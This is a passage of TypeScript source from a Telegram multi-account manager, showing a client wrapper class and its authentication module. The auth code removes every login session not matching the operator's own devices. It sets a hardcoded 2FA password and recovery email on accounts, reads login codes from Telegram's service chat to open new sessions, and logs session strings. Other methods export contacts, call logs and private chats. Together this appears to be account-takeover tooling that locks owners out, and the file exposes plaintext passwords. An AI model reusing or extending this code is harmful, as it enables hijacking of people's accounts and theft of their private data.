@IsOptional()\r\n    filename?: string;\r\n}","export * from './Telegram.controller';\r\nexport * from './Telegram.service';\r\nexport * from './Telegram.module';\r\nexport * from './dto/update-profile.dto';\r\nexport * from './dto/channel-operation.dto';\r\nexport * from './utils/connection-manager';\r\nexport * from './utils/telegram-logger';\r\nexport * from './utils/rate-limiter';","    import { Api, TelegramClient } from 'telegram';\r\n    import { StringSession } from 'telegram/sessions';\r\n    import { NewMessageEvent } from 'telegram/events';\r\n    import { TotalList } from 'telegram/Helpers';\r\n    import bigInt from 'big-integer';\r\n    import { EntityLike } from 'telegram/define';\r\n    import { TgContext, ActiveClientSetup, GroupCreationResult, GroupMember, AdminInfo, BannedUserInfo, SessionInfo, ThumbnailResult, MediaFileDownloadInfo, MediaListResponse, FilteredMediaListResponse, MediaQueryParams, SelfMessagesInfo, CallLogResult, TopPrivateChat, ChatStatistics, MessageStats, ChatListItem, ChatListResult, ContactStats, ImportContactResult, BlockListResult, ChatFolder, PrivacyBatchSettings, MessageScheduleOptions, EditMessageOptions, MediaBatchOptions, AlbumSendResult, VoiceMessageOptions, BotCreationResult, ChatSettingsUpdate, GroupSettingsUpdate, TerminateSessionOptions, DeleteChatParams, BotCreationOptions, ChatFolderCreateOptions, PerChatCallStats, ForwardResult, MessageItem } from './types';\r\n    import { SearchMessagesDto, SearchMessagesResponseDto } from '../dto/message-search.dto';\r\n    import { SendTgMessageDto } from '../dto/send-message.dto';\r\n    import { MediaAlbumOptions } from '../types/telegram-types';\r\n    import { GroupOptions } from '../../../interfaces/telegram';\r\n    import { TelegramLogger } from '../utils/telegram-logger';\r\n\r\n    // Domain operation imports\r\n    import * as clientOps from './client-operations';\r\n    import * as messageOps from './message-operations';\r\n    import * as mediaOps from './media-operations';\r\n    import * as channelOps from './channel-operations';\r\n    import * as contactOps from './contact-operations';\r\n    import * as profileOps from './profile-operations';\r\n    import * as authOps from './auth-operations';\r\n    import * as chatOps from './chat-operations';\r\nimport { IterDialogsParams } from 'telegram/client/dialogs';\r\nimport { Dialog } from 'telegram/tl/custom/dialog';\r\n\r\n    class TelegramManager {\r\n        private logger = new TelegramLogger('TgManager');\r\n        private session: StringSession;\r\n        public phoneNumber: string;\r\n        public client: TelegramClient | null;\r\n        public apiId: number;\r\n        public apiHash: string;\r\n        private timeoutErr: NodeJS.Timeout = null;\r\n        private static activeClientSetup: ActiveClientSetup;\r\n\r\n        constructor(sessionString: string, phoneNumber: string) {\r\n            this.session = new StringSession(sessionString);\r\n            this.phoneNumber = phoneNumber;\r\n            this.client = null;\r\n        }\r\n\r\n        private get ctx(): TgContext {\r\n            return {\r\n                client: this.client,\r\n                phoneNumber: this.phoneNumber,\r\n                logger: this.logger,\r\n            };\r\n        }\r\n\r\n        // ---- Static methods ----\r\n\r\n        public static getActiveClientSetup(): ActiveClientSetup {\r\n            return TelegramManager.activeClientSetup;\r\n        }\r\n\r\n        public static setActiveClientSetup(data: ActiveClientSetup | undefined): void {\r\n            TelegramManager.activeClientSetup = data;\r\n        }\r\n\r\n        // ---- Client lifecycle ----\r\n\r\n        clearTimeoutErr(): void {\r\n            if (this.timeoutErr) {\r\n                clearTimeout(this.timeoutErr);\r\n                this.timeoutErr = null; // BUG FIX: was == (comparison) instead of = (assignment)\r\n            }\r\n        }\r\n\r\n        async errorHandler(error: Error): Promise<void> {\r\n            this.clearTimeoutErr();\r\n            const result = clientOps.handleClientError(this.ctx, error);\r\n            if (result) this.timeoutErr = result;\r\n        }\r\n\r\n        async createClient(handler: boolean = true, handlerFn?: (event: NewMessageEvent) => Promise<void>): Promise<TelegramClient> {\r\n            const { getCredentialsForMobile } = require('../../../utils');\r\n            const tgCreds = await getCredentialsForMobile(this.phoneNumber);\r\n            this.apiHash = tgCreds.apiHash;\r\n            this.apiId = tgCreds.apiId;\r\n\r\n            this.client = await clientOps.createClient(this.ctx, this.session, handler, handlerFn);\r\n            return this.client;\r\n        }\r\n\r\n        async destroy(): Promise<void> {\r\n            this.clearTimeoutErr();\r\n            await clientOps.destroyClient(this.ctx, this.session);\r\n            this.client = null;\r\n        }\r\n\r\n        connected(): boolean {\r\n            return this.client.connected;\r\n        }\r\n\r\n        async connect(): Promise<void> {\r\n            await this.client.connect();\r\n        }\r\n\r\n        // ---- Chat / Entity operations ----\r\n\r\n        async getMe(): Promise<Api.User> {\r\n            return chatOps.getMe(this.ctx);\r\n        }\r\n\r\n        async getchatId(username: string): Promise<Api.TypeInputPeer> {\r\n            return chatOps.getchatId(this.ctx, username);\r\n        }\r\n\r\n        async getEntity(entity: EntityLike): Promise<Api.User | Api.Chat | Api.Channel> {\r\n            return chatOps.getEntity(this.ctx, entity);\r\n        }\r\n\r\n        async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8): Promise<TotalList<Api.Message>> {\r\n            return chatOps.getMessages(this.ctx, entityLike, limit);\r\n        }\r\n\r\n        async getAllChats(): ReturnType<typeof chatOps.getAllChats> {\r\n            return chatOps.getAllChats(this.ctx);\r\n        }\r\n\r\n        async getMessagesNew(chatId: string, offset: number = 0, limit: number = 20): Promise<MessageItem[]> {\r\n            return chatOps.getMessagesNew(this.ctx, chatId, offset, limit);\r\n        }\r\n\r\n        async safeGetEntity(entityId: string): Promise<Api.TypeUser | Api.TypeChat | Api.PeerChannel | null> {\r\n            return chatOps.safeGetEntityById(this.ctx, entityId);\r\n        }\r\n\r\n        async getSelfMSgsInfo(limit: number = 500): Promise<SelfMessagesInfo> {\r\n            return chatOps.getSelfMSgsInfo(this.ctx, limit);\r\n        }\r\n\r\n        async getCallLog(limit: number = 1000, options?: { includeCallLog?: boolean }): Promise<CallLogResult> {\r\n            return chatOps.getCallLog(this.ctx, limit, options);\r\n        }\r\n\r\n        async getChatStatistics(chatId: string, period: 'day' | 'week' | 'month'): Promise<ChatStatistics> {\r\n            return chatOps.getChatStatistics(this.ctx, chatId, period);\r\n        }\r\n\r\n        async getMessageStats(options: { chatId: string; period: 'day' | 'week' | 'month'; fromDate?: Date }): Promise<MessageStats> {\r\n            return chatOps.getMessageStats(this.ctx, options);\r\n        }\r\n\r\n        async getDialogs(iterDialogsParams: IterDialogsParams): Promise<TotalList<Dialog>> {\r\n            return await this.ctx.client.getDialogs(iterDialogsParams);\r\n        }\r\n\r\n        async getChats(options: { limit?: number; offsetDate?: number; folderId?: number; archived?: boolean; peerType?: 'all' | 'user' | 'group' | 'channel'; ignorePinned?: boolean; includePhotos?: boolean }): Promise<ChatListResult> {\r\n            return chatOps.getChats(this.ctx, options);\r\n        }\r\n\r\n        async updateChatSettings(settings: ChatSettingsUpdate): Promise<boolean> {\r\n            return chatOps.updateChatSettings(this.ctx, settings);\r\n        }\r\n\r\n        async getTopPrivateChats(limit: number = 10): Promise<TopPrivateChat[]> {\r\n            return chatOps.getTopPrivateChats(this.ctx, limit);\r\n        }\r\n\r\n        async createChatFolder(options: ChatFolderCreateOptions): Promise<{ id: number; name: string; options: Record<string, boolean> }> {\r\n            return chatOps.createChatFolder(this.ctx, options);\r\n        }\r\n\r\n        async getChatFolders(): Promise<ChatFolder[]> {\r\n            return chatOps.getChatFolders(this.ctx);\r\n        }\r\n\r\n        async createBot(options: BotCreationOptions): Promise<BotCreationResult> {\r\n            return chatOps.createBot(this.ctx, options);\r\n        }\r\n\r\n        // ---- Message operations ----\r\n\r\n        async sendMessage(params: SendTgMessageDto): Promise<Api.Message> {\r\n            return messageOps.sendMessageToChat(this.ctx, params);\r\n        }\r\n\r\n        async sendInlineMessage(chatId: string, message: string, url: string): Promise<Api.Message> {\r\n            return messageOps.sendInlineMessage(this.ctx, chatId, message, url);\r\n        }\r\n\r\n        async forwardSecretMsgs(fromChatId: string, toChatId: string): Promise<ForwardResult> {\r\n            return messageOps.forwardSecretMsgs(this.ctx, fromChatId, toChatId);\r\n        }\r\n\r\n        async forwardMessages(fromChatId: string, toChatId: string, messageIds: number[]): Promise<number> {\r\n            return messageOps.forwardMessages(this.ctx, fromChatId, toChatId, messageIds);\r\n        }\r\n\r\n        async forwardMessage(toChatId: string, fromChatId: string, messageId: number): Promise<void> {\r\n            return messageOps.forwardMessage(this.ctx, toChatId, fromChatId, messageId);\r\n        }\r\n\r\n        async searchMessages(params: SearchMessagesDto): Promise<SearchMessagesResponseDto> {\r\n            return messageOps.searchMessages(this.ctx, params);\r\n        }\r\n\r\n        async scheduleMessageSend(opts: MessageScheduleOptions): Promise<Api.Message | Api.TypeUpdates> {\r\n            return messageOps.scheduleMessageSend(this.ctx, opts);\r\n        }\r\n\r\n        async getScheduledMessages(chatId: string): Promise<import('./types').ScheduledMessageItem[]> {\r\n            return messageOps.getScheduledMessages(this.ctx, chatId);\r\n        }\r\n\r\n        async sendMediaAlbum(album: MediaAlbumOptions): Promise<AlbumSendResult> {\r\n            return messageOps.sendMediaAlbum(this.ctx, album);\r\n        }\r\n\r\n        async sendVoiceMessage(voice: VoiceMessageOptions): Promise<Api.TypeUpdates> {\r\n            return messageOps.sendVoiceMessage(this.ctx, voice);\r\n        }\r\n\r\n        async cleanupChat(cleanup: { chatId: string; beforeDate?: Date; onlyMedia?: boolean; excludePinned?: boolean; revoke?: boolean }): Promise<{ deletedCount: number }> {\r\n            return messageOps.cleanupChat(this.ctx, cleanup);\r\n        }\r\n\r\n        async editMessage(options: EditMessageOptions): Promise<Api.TypeUpdates> {\r\n            return messageOps.editMessage(this.ctx, options);\r\n        }\r\n\r\n        async sendMediaBatch(options: MediaBatchOptions): Promise<Api.TypeUpdates> {\r\n            return messageOps.sendMediaBatch(this.ctx, options);\r\n        }\r\n\r\n        async sendViewOnceMedia(chatId: string, buffer: Buffer, caption?: string, isVideo?: boolean, filename?: string): Promise<Api.TypeUpdates> {\r\n            return messageOps.sendViewOnceMedia(this.ctx, chatId, buffer, caption, isVideo, filename);\r\n        }\r\n\r\n        async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {\r\n            return messageOps.sendPhotoChat(this.ctx, id, url, caption, filename);\r\n        }\r\n\r\n        async sendFileChat(id: string, url: string, caption: string, filename: string): Promise<void> {\r\n            return messageOps.sendFileChat(this.ctx, id, url, caption, filename);\r\n        }\r\n\r\n        async deleteChat(params: DeleteChatParams): Promise<void> {\r\n            return messageOps.deleteChat(this.ctx, params);\r\n        }\r\n\r\n        // ---- Media operations ----\r\n\r\n        async getMediaUrl(message: Api.Message): Promise<string | Buffer> {\r\n            return mediaOps.getMediaUrl(this.ctx, message);\r\n        }\r\n\r\n        async getMediaMessages(): Promise<Api.messages.Messages> {\r\n            return mediaOps.getMediaMessages(this.ctx);\r\n        }\r\n\r\n        async getThumbnail(messageId: number, chatId: string = 'me'): Promise<ThumbnailResult> {\r\n            return mediaOps.getThumbnail(this.ctx, messageId, chatId);\r\n        }\r\n\r\n        async getMediaFileDownloadInfo(messageId: number, chatId: string = 'me'): Promise<MediaFileDownloadInfo> {\r\n            return mediaOps.getMediaFileDownloadInfo(this.ctx, messageId, chatId);\r\n        }\r\n\r\n        async *streamMediaFile(\r\n            fileLocation: Api.TypeInputFileLocation,\r\n            offset: bigInt.BigInteger = bigInt(0),\r\n            limit: number = 5 * 1024 * 1024,\r\n            requestSize: number = 512 * 1024\r\n        ): AsyncGenerator<Buffer> {\r\n            yield* mediaOps.streamMediaFile(this.ctx, fileLocation, offset, limit, requestSize);\r\n        }\r\n\r\n        async getMediaMetadata(params: MediaQueryParams): Promise<MediaListResponse> {\r\n            return mediaOps.getMediaMetadata(this.ctx, params);\r\n        }\r\n\r\n        async getAllMediaMetaData(params: MediaQueryParams): Promise<MediaListResponse> {\r\n            return mediaOps.getAllMediaMetaData(this.ctx, params);\r\n        }\r\n\r\n        async getFilteredMedia(params: MediaQueryParams): Promise<FilteredMediaListResponse> {\r\n            return mediaOps.getFilteredMedia(this.ctx, params);\r\n        }\r\n\r\n        async getFileUrl(url: string, filename: string): Promise<string> {\r\n            return mediaOps.getFileUrl(this.ctx, url, filename);\r\n        }\r\n\r\n        // ---- Channel / Group operations ----\r\n\r\n        async createGroup(): Promise<GroupCreationResult> {\r\n            return channelOps.createGroup(this.ctx);\r\n        }\r\n\r\n        async archiveChat(id: bigInt.BigInteger, accessHash: bigInt.BigInteger): Promise<Api.TypeUpdates> {\r\n            return channelOps.archiveChat(this.ctx, id, accessHash);\r\n        }\r\n\r\n        async forwardMedia(channel: string, fromChatId: string): Promise<void> {\r\n            return channelOps.forwardMedia(this.ctx, channel, fromChatId);\r\n        }\r\n\r\n        async joinChannel(entity: EntityLike): Promise<Api.TypeUpdates> {\r\n            return channelOps.joinChannel(this.ctx, entity);\r\n        }\r\n\r\n        async leaveChannels(chats: string[]): Promise<void> {\r\n            return channelOps.leaveChannels(this.ctx, chats);\r\n        }\r\n\r\n        async getGrpMembers(entity: EntityLike): Promise<GroupMember[]> {\r\n            return channelOps.getGrpMembers(this.ctx, entity);\r\n        }\r\n\r\n        async addGroupMembers(groupId: string, members: string[]): Promise<void> {\r\n            return channelOps.addGroupMembers(this.ctx, groupId, members);\r\n        }\r\n\r\n        async removeGroupMembers(groupId: string, members: string[]): Promise<void> {\r\n            return channelOps.removeGroupMembers(this.ctx, groupId, members);\r\n        }\r\n\r\n        async promoteToAdmin(groupId: string, userId: string, permissions?: Partial<{\r\n            changeInfo: boolean; postMessages: boolean; editMessages: boolean;\r\n            deleteMessages: boolean; banUsers: boolean; inviteUsers: boolean;\r\n            pinMessages: boolean; addAdmins: boolean; anonymous: boolean; manageCall: boolean;\r\n        }>, rank?: string): Promise<void> {\r\n            return channelOps.promoteToAdmin(this.ctx, groupId, userId, permissions, rank);\r\n        }\r\n\r\n        async demoteAdmin(groupId: string, userId: string): Promise<void> {\r\n            return channelOps.demoteAdmin(this.ctx, groupId, userId);\r\n        }\r\n\r\n        async unblockGroupUser(groupId: string, userId: string): Promise<void> {\r\n            return channelOps.unblockGroupUser(this.ctx, groupId, userId);\r\n        }\r\n\r\n        async getGroupAdmins(groupId: string): Promise<AdminInfo[]> {\r\n            return channelOps.getGroupAdmins(this.ctx, groupId);\r\n        }\r\n\r\n        async getGroupBannedUsers(groupId: string): Promise<BannedUserInfo[]> {\r\n            return channelOps.getGroupBannedUsers(this.ctx, groupId);\r\n        }\r\n\r\n        async createGroupOrChannel(options: GroupOptions): Promise<Api.TypeUpdates> {\r\n            return channelOps.createGroupOrChannel(this.ctx, options);\r\n        }\r\n\r\n        async createGroupWithOptions(options: GroupOptions): Promise<Api.Chat | Api.Channel> {\r\n            return channelOps.createGroupWithOptions(this.ctx, options);\r\n        }\r\n\r\n        async updateGroupSettings(settings: GroupSettingsUpdate): Promise<boolean> {\r\n            return channelOps.updateGroupSettings(this.ctx, settings);\r\n        }\r\n\r\n        // ---- Contact operations ----\r\n\r\n        async addContact(data: { mobile: string; tgId: string }[], namePrefix: string): Promise<void> {\r\n            return contactOps.addContact(this.ctx, data, namePrefix);\r\n        }\r\n\r\n        async addContacts(mobiles: string[], namePrefix: string): Promise<void> {\r\n            return contactOps.addContacts(this.ctx, mobiles, namePrefix);\r\n        }\r\n\r\n        async getContacts(): Promise<Api.contacts.TypeContacts> {\r\n            return contactOps.getContacts(this.ctx);\r\n        }\r\n\r\n        async blockUser(chatId: string): Promise<void> {\r\n            return contactOps.blockUser(this.ctx, chatId);\r\n        }\r\n\r\n        async exportContacts(format: 'vcard' | 'csv', includeBlocked: boolean = false): Promise<string> {\r\n            return contactOps.exportContacts(this.ctx, format, includeBlocked);\r\n        }\r\n\r\n        async importContacts(data: { firstName: string; lastName?: string; phone: string }[]): Promise<ImportContactResult[]> {\r\n            return contactOps.importContacts(this.ctx, data);\r\n        }\r\n\r\n        async manageBlockList(userIds: string[], block: boolean): Promise<BlockListResult[]> {\r\n            return contactOps.manageBlockList(this.ctx, userIds, block);\r\n        }\r\n\r\n        async getContactStatistics(): Promise<ContactStats> {\r\n            return contactOps.getContactStatistics(this.ctx);\r\n        }\r\n\r\n        async sendContactsFile(chatId: string, contacts: Api.contacts.Contacts, filename?: string): Promise<void> {\r\n            return contactOps.sendContactsFile(this.ctx, chatId, contacts, filename);\r\n        }\r\n\r\n        // ---- Profile operations ----\r\n\r\n        async updatePrivacy(): Promise<void> {\r\n            return profileOps.updatePrivacy(this.ctx);\r\n        }\r\n\r\n        async updatePrivacyforDeletedAccount(): Promise<void> {\r\n            return profileOps.updatePrivacyforDeletedAccount(this.ctx);\r\n        }\r\n\r\n        async updatePrivacyBatch(settings: PrivacyBatchSettings): Promise<boolean> {\r\n            return profileOps.updatePrivacyBatch(this.ctx, settings);\r\n        }\r\n\r\n        async updateProfile(firstName: string, about: string): Promise<void> {\r\n            return profileOps.updateProfile(this.ctx, firstName, about);\r\n        }\r\n\r\n        async updateUsername(baseUsername: string): Promise<string> {\r\n            return profileOps.updateUsername(this.ctx, baseUsername);\r\n        }\r\n\r\n        async updateProfilePic(image: string): Promise<void> {\r\n            return profileOps.updateProfilePic(this.ctx, image);\r\n        }\r\n\r\n        async downloadProfilePic(photoIndex: number): Promise<string | undefined> {\r\n            return profileOps.downloadProfilePic(this.ctx, photoIndex);\r\n        }\r\n\r\n        async deleteProfilePhotos(): Promise<void> {\r\n            return profileOps.deleteProfilePhotos(this.ctx);\r\n        }\r\n\r\n        // ---- Auth / Session operations ----\r\n\r\n        async removeOtherAuths(): Promise<void> {\r\n            return authOps.removeOtherAuths(this.ctx);\r\n        }\r\n\r\n        async getAuths(): Promise<Api.account.Authorizations> {\r\n            return authOps.getAuths(this.ctx);\r\n        }\r\n\r\n        async getLastActiveTime(): Promise<string> {\r\n            return authOps.getLastActiveTime(this.ctx);\r\n        }\r\n\r\n        async hasPassword(): Promise<boolean> {\r\n            return authOps.hasPassword(this.ctx);\r\n        }\r\n\r\n        async set2fa(): Promise<{ email: string; hint: string; newPassword: string } | void> {\r\n            return authOps.set2fa(this.ctx);\r\n        }\r\n\r\n        async createNewSession(): Promise<string> {\r\n            return authOps.createNewSession(this.ctx);\r\n        }\r\n\r\n        async waitForOtp(): Promise<string> {\r\n            return authOps.waitForOtp(this.ctx);\r\n        }\r\n\r\n        async getSessionInfo(): Promise<SessionInfo> {\r\n            return authOps.getSessionInfo(this.ctx);\r\n        }\r\n\r\n        async terminateSession(options: TerminateSessionOptions): Promise<boolean> {\r\n            return authOps.terminateSession(this.ctx, options);\r\n        }\r\n\r\n        // ---- Event handling ----\r\n\r\n        async handleEvents(event: NewMessageEvent): Promise<void> {\r\n            return clientOps.handleIncomingEvent(this.ctx, event);\r\n        }\r\n\r\n        // Dead code removed: forwardMediaToBot (was entirely commented out)\r\n    }\r\n\r\n    export default TelegramManager;\r\n","import { Api, TelegramClient } from 'telegram';\r\nimport { StringSession } from 'telegram/sessions';\r\nimport { sleep } from 'telegram/Helpers';\r\nimport bigInt from 'big-integer';\r\nimport { TgContext, SessionInfo } from './types';\r\nimport { parseError } from '../../../utils/parseError';\r\nimport { fetchWithTimeout } from '../../../utils/fetchWithTimeout';\r\nimport { notifbot } from '../../../utils/logbots';\r\nimport { generateTGConfig } from '../utils/generateTGConfig';\r\nimport { MailReader } from '../../../IMap/IMap';\r\n\r\nexport function isOwnAuth(auth: Api.Authorization): boolean {\r\n    const authCriteria = [\r\n        { field: 'country', value: 'singapore' },\r\n        { field: 'deviceModel', values: ['oneplus 11', 'cli', 'linux', 'windows'] },\r\n        { field: 'appName', values: ['likki', 'rams', 'sru', 'shru', 'hanslnz'] },\r\n    ];\r\n\r\n    return authCriteria.some(criterion => {\r\n        const fieldValue = auth[criterion.field]?.toLowerCase?.() || '';\r\n\r\n        if (criterion.field === 'deviceModel' && fieldValue.endsWith('ssk')) return true;\r\n\r\n        if ('values' in criterion) {\r\n            return criterion.values.some(value => fieldValue.includes(value.toLowerCase()));\r\n        }\r\n\r\n        return fieldValue.includes(criterion.value.toLowerCase());\r\n    });\r\n}\r\n\r\nexport async function removeOtherAuths(ctx: TgContext): Promise<void> {\r\n    if (!ctx.client) throw new Error('Client is not initialized');\r\n    const result = await ctx.client.invoke(new Api.account.GetAuthorizations());\r\n    for (const auth of result.authorizations) {\r\n        if (isOwnAuth(auth)) continue;\r\n        await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Removing Auth : ${ctx.phoneNumber}\\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);\r\n        await resetAuthorization(ctx, auth);\r\n    }\r\n}\r\n\r\nasync function resetAuthorization(ctx: TgContext, auth: Api.Authorization): Promise<void> {\r\n    try {\r\n        await ctx.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));\r\n    } catch (error) {\r\n        parseError(error, `Failed to reset authorization for ${ctx.phoneNumber}\\n${auth.appName}:${auth.country}:${auth.deviceModel} `);\r\n    }\r\n}\r\n\r\nexport async function getAuths(ctx: TgContext): Promise<Api.account.Authorizations> {\r\n    if (!ctx.client) throw new Error('Client is not initialized');\r\n    return await ctx.client.invoke(new Api.account.GetAuthorizations());\r\n}\r\n\r\nexport async function getLastActiveTime(ctx: TgContext): Promise<string> {\r\n    if (!ctx.client) throw new Error('Client is not initialized');\r\n\r\n    try {\r\n        const result = await ctx.client.invoke(new Api.account.GetAuthorizations());\r\n        let latest = 0;\r\n\r\n        result.authorizations.forEach((auth) => {\r\n            if (!isOwnAuth(auth)) {\r\n                if (auth.dateActive && latest < auth.dateActive) {\r\n                    latest = auth.dateActive;\r\n                }\r\n            }\r\n        });\r\n\r\n        if (latest === 0) return new Date().toISOString().split('T')[0];\r\n        return new Date(latest * 1000).toISOString().split('T')[0];\r\n    } catch (error) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Error getting last active time:', error);\r\n        return new Date().toISOString().split('T')[0];\r\n    }\r\n}\r\n\r\nexport async function hasPassword(ctx: TgContext): Promise<boolean> {\r\n    if (!ctx.client) throw new Error('Client is not initialized');\r\n    try {\r\n        const passwordInfo = await ctx.client.invoke(new Api.account.GetPassword());\r\n        return passwordInfo.hasPassword || false;\r\n    } catch (error) {\r\n        ctx.logger.error(ctx.phoneNumber, 'Error checking password status:', error);\r\n        return false;\r\n    }\r\n}\r\n\r\nexport async function set2fa(ctx: TgContext): Promise<{ email: string; hint: string; newPassword: string } | void> {\r\n    if (!(await hasPassword(ctx))) {\r\n        ctx.logger.info(ctx.phoneNumber, 'Password Does not exist, Setting 2FA');\r\n\r\n        const imapService = MailReader.getInstance();\r\n        const twoFaDetails = {\r\n            email: 'storeslaksmi@gmail.com',\r\n            hint: 'password - India143',\r\n            newPassword: 'Ajtdmwajt1@',\r\n        };\r\n\r\n        try {\r\n            await imapService.connectToMail();\r\n            const checkMailInterval = setInterval(async () => {\r\n                ctx.logger.info(ctx.phoneNumber, 'Checking if mail is ready');\r\n\r\n                if (imapService.isMailReady()) {\r\n                    clearInterval(checkMailInterval);\r\n                    ctx.logger.info(ctx.phoneNumber, 'Mail is ready, checking code!');\r\n                    await ctx.client.updateTwoFaSettings({\r\n                        isCheckPassword: false,\r\n                        email: twoFaDetails.email,\r\n                        hint: twoFaDetails.hint,\r\n                        newPassword: twoFaDetails.newPassword,\r\n                        emailCodeCallback: async (length: number) => {\r\n                            ctx.logger.info(ctx.phoneNumber, 'Code sent');\r\n                            return new Promise(async (resolve, reject) => {\r\n                                let retry = 0;\r\n                                const codeInterval = setInterval(async () => {\r\n                                    try {\r\n                                        ctx.logger.info(ctx.phoneNumber, 'Checking code');\r\n                                        retry++;\r\n                                        if (imapService.isMailReady() && retry < 4) {\r\n                                            const code = await imapService.getCode();\r\n                                            ctx.logger.info(ctx.phoneNumber, 'Code:', code);\r\n                                            if (code) {\r\n                                                await imapService.disconnectFromMail();\r\n                                                clearInterval(codeInterval);\r\n                                                resolve(code);\r\n                                            }\r\n                                        } else {\r\n                                            clearInterval(codeInterval);\r\n                                            await imapService.disconnectFromMail();\r\n                                            reject(new Error('Failed to retrieve code'));\r\n                                        }\r\n                                    } catch (error) {\r\n                                        clearInterval(codeInterval);\r\n                                        await imapService.disconnectFromMail();\r\n                                        reject(error);\r\n                                    }\r\n                                }, 10000);\r\n                            });\r\n                        },\r\n                        onEmailCodeError: (e: Error) => {\r\n                            ctx.logger.error(ctx.phoneNumber, 'Email code error:', parseError(e));\r\n                            return Promise.resolve('error');\r\n                        },\r\n                    });\r\n\r\n                    return twoFaDetails;\r\n                } else {\r\n                    ctx.logger.info(ctx.phoneNumber, 'Mail not ready yet');\r\n                }\r\n            }, 5000);\r\n        } catch (e) {\r\n            ctx.logger.error(ctx.phoneNumber, 'Unable to connect to mail server:', parseError(e));\r\n        }\r\n    } else {\r\n        ctx.logger.info(ctx.phoneNumber, 'Password already exists');\r\n    }\r\n}\r\n\r\nexport async function createNewSession(ctx: TgContext): Promise<string> {\r\n    const timeoutPromise = new Promise<string>((_, reject) =>\r\n        setTimeout(() => reject(new Error('Session creation timed out after 1 minute')), 1 * 60 * 1000)\r\n    );\r\n\r\n    const sessionPromise = (async () => {\r\n        const me = <Api.User>await ctx.client.getMe();\r\n        ctx.logger.info(ctx.phoneNumber, 'Creating new session for: ', me.phone);\r\n\r\n        const newClient = new TelegramClient(\r\n            new StringSession(''),\r\n            parseInt(process.env.API_ID),\r\n            process.env.API_HASH,\r\n            await generateTGConfig(ctx.phoneNumber)\r\n        );\r\n\r\n        ctx.logger.info(ctx.phoneNumber, 'Starting Session Creation...');\r\n        await newClient.start({\r\n            phoneNumber: me.phone,\r\n            password: async () => 'Ajtdmwajt1@',\r\n            phoneCode: async () => {\r\n                ctx.logger.info(ctx.phoneNumber, 'Waiting for the OTP code from chat ID 777000...');\r\n                return await waitForOtp(ctx);\r\n            },\r\n            onError: (err: Error) => { throw err; },\r\n        });\r\n\r\n        ctx.logger.info(ctx.phoneNumber, 'Session Creation Completed');\r\n        const session = <string><unknown>newClient.session.save();\r\n\r\n        await newClient.destroy();\r\n        ctx.logger.info(ctx.phoneNumber, 'New Session: ', session);\r\n\r\n        return session;\r\n    })();\r\n\r\n    return Promise.race([sessionPromise, timeoutPromise]);\r\n}\r\n\r\nexport async function waitForOtp(ctx: TgContext): Promise<string> {\r\n    for (let i = 0; i < 3; i++) {\r\n        try {\r\n            ctx.logger.info(ctx.phoneNumber, 'Attempt : ', i);\r\n            const messages = await ctx.client.getMessages('777000', { limit: 1 });\r\n            const message = messages[0];\r\n            if (message && message.date && message.date * 1000 > Date.now() - 60000) {\r\n                const code = message.text.split('.')[0].split('code:**')[1].trim();\r\n                ctx.logger.info(ctx.phoneNumber, 'returning: ', code);\r\n                return code;\r\n            } else {\r\n                ctx.logger.info(ctx.phoneNumber, `Message Date: ${new Date(message.date * 1000).toISOString()} Now: ${new Date(Date.now() - 60000).toISOString()}`);\r\n                const code = message.text.split('.')[0].split('code:**')[1].trim();\r\n                ctx.logger.info(ctx.phoneNumber, 'Skipped Code: ', code);\r\n                if (i == 2) return code;\r\n                await sleep(5000);\r\n            }\r\n        } catch (err) {\r\n            await sleep(2000);\r\n            ctx.logger.info(ctx.phoneNumber, err);\r\n        }\r\n    }\r\n    throw new Error('Failed to get OTP after 3 attempts');\r\n}\r\n\r\nexport async function getSessionInfo(ctx: TgContext): Promise<SessionInfo> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    const [authorizationsResult, devicesResult] = await Promise.all([\r\n        ctx.client.invoke(new Api.account.GetAuthorizations()),\r\n        ctx.client.invoke(new Api.account.GetWebAuthorizations()),\r\n    ]);\r\n\r\n    const sessions = authorizationsResult.authorizations.map(auth => ({\r\n        hash: auth.hash.toString(),\r\n        deviceModel: auth.deviceModel,\r\n        platform: auth.platform,\r\n        systemVersion: auth.systemVersion,\r\n        appName: auth.appName,\r\n        dateCreated: new Date(auth.dateCreated * 1000),\r\n        dateActive: new Date(auth.dateActive * 1000),\r\n        ip: auth.ip,\r\n        country: auth.country,\r\n        region: auth.region,\r\n    }));\r\n\r\n    const webSessions = devicesResult.authorizations.map(auth => ({\r\n        hash: auth.hash.toString(),\r\n        domain: auth.domain,\r\n        browser: auth.browser,\r\n        platform: auth.platform,\r\n        dateCreated: new Date(auth.dateCreated * 1000),\r\n        dateActive: new Date(auth.dateActive * 1000),\r\n        ip: auth.ip,\r\n        region: auth.region,\r\n    }));\r\n\r\n    return { sessions, webSessions };\r\n}\r\n\r\nexport async function terminateSession(ctx: TgContext, options: {\r\n    hash: string;\r\n    type: 'app' | 'web';\r\n    exceptCurrent?: boolean;\r\n}): Promise<boolean> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    if (options.exceptCurrent) {\r\n        if (options.type === 'app') {\r\n            await ctx.client.invoke(new Api.auth.ResetAuthorizations());\r\n        } else {\r\n            await ctx.client.invoke(new Api.account.ResetWebAuthorizations());\r\n        }\r\n        return true;\r\n    }\r\n\r\n    if (options.type === 'app') {\r\n        await ctx.client.invoke(new Api.account.ResetAuthorization({ hash: bigInt(options.hash) }));\r\n    } else {\r\n        await ctx.client.invoke(new Api.account.ResetWebAuthorization({ hash: bigInt(options.hash) }));\r\n    }\r\n    return true;\r\n}\r\n","import { Api } from 'telegram';\r\nimport { sleep } from 'telegram/Helpers';\r\nimport bigInt from 'big-integer';\r\nimport { EntityLike } from 'telegram/define';\r\nimport { CustomFile } from 'telegram/client/uploads';\r\nimport { Dialog } from 'telegram/tl/custom/dialog';\r\nimport { TgContext, GroupCreationResult, GroupMember, AdminInfo, BannedUserInfo, GroupSettingsUpdate } from './types';\r\nimport { GroupOptions } from '../../../interfaces/telegram';\r\nimport { parseError } from '../../../utils/parseError';\r\nimport isPermanentError from '../../../utils/isPermanentError';\r\nimport { downloadFileFromUrl } from './helpers';\r\nimport { connectionManager } from '../utils/connection-manager';\r\n\r\nexport async function createGroup(ctx: TgContext): Promise<GroupCreationResult> {\r\n    const groupName = 